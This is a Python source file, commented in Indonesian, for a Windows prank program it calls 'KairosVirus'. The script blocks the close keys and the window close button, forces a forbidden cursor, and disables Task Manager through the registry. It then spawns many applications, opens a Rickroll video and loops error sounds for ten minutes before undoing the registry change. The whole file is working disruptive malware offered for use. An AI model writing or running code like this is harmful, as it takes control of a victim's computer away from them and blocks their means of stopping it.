import os
import sys
import subprocess
import time
import threading
import keyboard
import ctypes
import webbrowser
from ctypes import windll, wintypes, byref

class KairosVirus:
    def __init__(self):
        self.running = True
        self.user32 = ctypes.windll.user32

    def play_error_sound(self):
        os.system('powershell -c "(New-Object Media.SoundPlayer \'C:\Windows\Media\Windows Error.wav\').PlaySync()"')

    def block_everything(self):
        def global_key_block(event):
            # Blokir semua kombinasi close
            if (event.name == 'f4' and event.alt) or \
               (event.name == 'escape') or \
               (event.name == 'q' and event.ctrl):
                self.play_error_sound()
                return False
            return True

        def block_cursor_and_close():
            while self.running:
                try:
                    # Blokir tombol close pada semua window
                    hwnd = self.user32.GetForegroundWindow()
                    
                    # Nonaktifkan tombol close di system menu
                    self.user32.EnableMenuItem(
                        self.user32.GetSystemMenu(hwnd, False), 
                        0xF060,  # SC_CLOSE
                        0x00000001  # MF_GRAYED
                    )
                    
                    # Blokir kursor dengan ikon terlarang
                    self.user32.SetCursor(
                        self.user32.LoadCursorW(None, 32648)  # IDC_NO cursor
                    )
                except Exception:
                    pass
                time.sleep(0.1)

        # Hook global keyboard
        keyboard.on_press(global_key_block, suppress=True)

        # Thread untuk blokir kursor
        cursor_block_thread = threading.Thread(target=block_cursor_and_close)
        cursor_block_thread.daemon = True
        cursor_block_thread.start()

    def open_applications(self):
        apps = [
            'start msedge',
            'start explorer',
            'start ms-windows-store:',
            'start notepad',
            'start calc',
            'start mspaint',
            'start wordpad',
            'start write',  # Tambahan
            'start charmap',  # Tambahan
            'start snippingtool',  # Tambahan
            'start magnify',  # Tambahan
            'start osk'  # Tambahan
        ]
        
        for app in apps:
            try:
                subprocess.Popen(app, shell=True)
                time.sleep(0.5)
            except Exception as e:
                print(f"Failed to open {app}: {e}")

    def open_rickroll_link(self):
        try:
            webbrowser.get('windows-default').open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except Exception as e:
            print(f"Failed to open link: {e}")

    def disable_task_manager(self):
        # Nonaktifkan Task Manager
        os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

    def block_taskbar_icons(self):
        def block_taskbar_hover():
            while self.running:
                try:
                    # Blokir hover pada taskbar icons
                    self.user32.SetCursor(
                        self.user32.LoadCursorW(None, 32648)  # IDC_NO cursor
                    )
                except Exception:
                    pass
                time.sleep(0.1)

        taskbar_block_thread = threading.Thread(target=block_taskbar_hover)
        taskbar_block_thread.daemon = True
        taskbar_block_thread.start()

    def run(self):
        # Blokir semua close dan kursor
        self.block_everything()
        
        # Nonaktifkan Task Manager
        self.disable_task_manager()
        
        # Buka aplikasi
        self.open_applications()
        
        # Buka link Rickroll di Edge
        self.open_rickroll_link()
        
        # Blokir taskbar icons
        self.block_taskbar_icons()
        
        # Jalankan selama 10 menit
        start_time = time.time()
        while self.running and time.time() - start_time < 600:  # 10 menit
            try:
                # Mainkan error sound secara acak
                if time.time() % 5 < 0.5:
                    self.play_error_sound()
                time.sleep(0.5)
            except Exception:
                pass
        
        # Kembalikan Task Manager
        os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f')
        
        # Lepaskan semua hook
        keyboard.unhook_all()

def main():
    print("Kairos Virus Activated!")
    print("Cannot be canceled for 10 minutes...")
    
    virus = KairosVirus()
    virus.run()

if __name__ == "__main__":
    main()